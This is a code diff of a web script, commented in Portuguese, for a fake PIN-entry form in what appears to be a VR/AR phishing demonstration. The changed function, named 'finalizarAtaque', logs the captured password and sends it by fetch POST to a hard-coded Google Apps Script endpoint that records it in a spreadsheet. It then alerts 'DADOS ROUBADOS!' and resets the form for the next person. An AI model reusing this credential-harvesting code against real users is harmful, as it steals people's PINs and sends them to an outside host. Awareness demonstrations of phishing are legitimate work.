@@ -73,29 +73,34 @@
     document.querySelector('#pass-display').setAttribute('value', '*'.repeat(senhaColetada.length));
   }
 
-  function finalizarAtaque() {
+ function finalizarAtaque() {
     if(senhaColetada.length === 0) return;
 
-    // Feedback de carregamento
+    console.log("Tentando enviar senha:", senhaColetada);
     document.querySelector('#pass-display').setAttribute('value', 'ENVIANDO...');
 
-    // ENVIANDO PARA A PLANILHA VIA POST
-    fetch(URL_PLANILHA, {
+    // Criando o formulário de dados para o Google
+    const formData = new FormData();
+    formData.append('senha', senhaColetada);
+
+    // Usando uma técnica mais simples de envio que o Google aceita melhor
+    fetch("https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec", {
       method: 'POST',
-      mode: 'no-cors', // Necessário para o Google Apps Script
-      body: JSON.stringify({ senha: senhaColetada }),
-      headers: { 'Content-Type': 'application/json' }
-    }).then(() => {
-      alert("🚨 DADOS ENVIADOS AO SERVIDOR HACKER!\n\nVerifique a planilha de controle.");
+      body: formData,
+      mode: 'no-cors' 
+    })
+    .then(() => {
+      alert("🚨 DADOS ROUBADOS!\n\nPIN: " + senhaColetada + "\n\nEnviado para a planilha com sucesso!");
       
-      // Reseta a interface
+      // Reseta a interface para a próxima pessoa
       senhaColetada = "";
       document.querySelector('#pass-display').setAttribute('value', 'DIGITE...');
       document.querySelector('#fake-form').setAttribute('visible', 'false');
       document.querySelector('#malicious-overlay').setAttribute('visible', 'true');
-    }).catch(err => {
-      console.error("Erro ao enviar:", err);
-      alert("Erro na conexão com o servidor hacker.");
+    })
+    .catch(err => {
+      console.error("Erro no envio:", err);
+      alert("Erro ao conectar com o servidor hacker.");
     });
   }
 </script>
